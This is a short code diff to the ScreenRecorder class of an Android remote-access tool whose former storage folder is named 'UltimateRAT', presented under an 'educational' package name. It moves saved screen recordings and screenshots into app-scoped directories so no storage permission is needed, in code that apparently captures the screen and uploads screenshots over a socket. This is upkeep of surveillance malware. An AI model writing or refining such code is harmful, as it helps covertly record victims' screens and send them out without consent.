@@ -8,7 +8,6 @@ import android.hardware.display.VirtualDisplay;
 import android.media.MediaRecorder;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
-import android.os.Environment;
 import android.util.DisplayMetrics;
 import android.view.WindowManager;
 import com.remoteaccess.educational.network.SocketManager;
@@ -153,11 +152,11 @@ public class ScreenRecorder {
      */
     private void setupMediaRecorder() {
         try {
-            // Create output file
-            File recordingsDir = new File(
-                Environment.getExternalStorageDirectory(),
-                "UltimateRAT/Recordings"
-            );
+            // Use app-scoped external files dir (no permission needed on Android 4.4+),
+            // falling back to internal files dir if external is unavailable.
+            File externalDir = context.getExternalFilesDir(null);
+            File baseDir = (externalDir != null) ? externalDir : context.getFilesDir();
+            File recordingsDir = new File(baseDir, "Recordings");
             
             if (!recordingsDir.exists()) {
                 recordingsDir.mkdirs();
@@ -321,11 +320,11 @@ public class ScreenRecorder {
     private void saveAndUploadScreenshot(android.graphics.Bitmap bitmap) {
         new Thread(() -> {
             try {
-                // Create output file
-                File screenshotsDir = new File(
-                    Environment.getExternalStorageDirectory(),
-                    "UltimateRAT/Screenshots"
-                );
+                // Use app-scoped external files dir (no permission needed on Android 4.4+),
+                // falling back to internal files dir if external is unavailable.
+                File externalDir = context.getExternalFilesDir(null);
+                File baseDir = (externalDir != null) ? externalDir : context.getFilesDir();
+                File screenshotsDir = new File(baseDir, "Screenshots");
                 
                 if (!screenshotsDir.exists()) {
                     screenshotsDir.mkdirs();
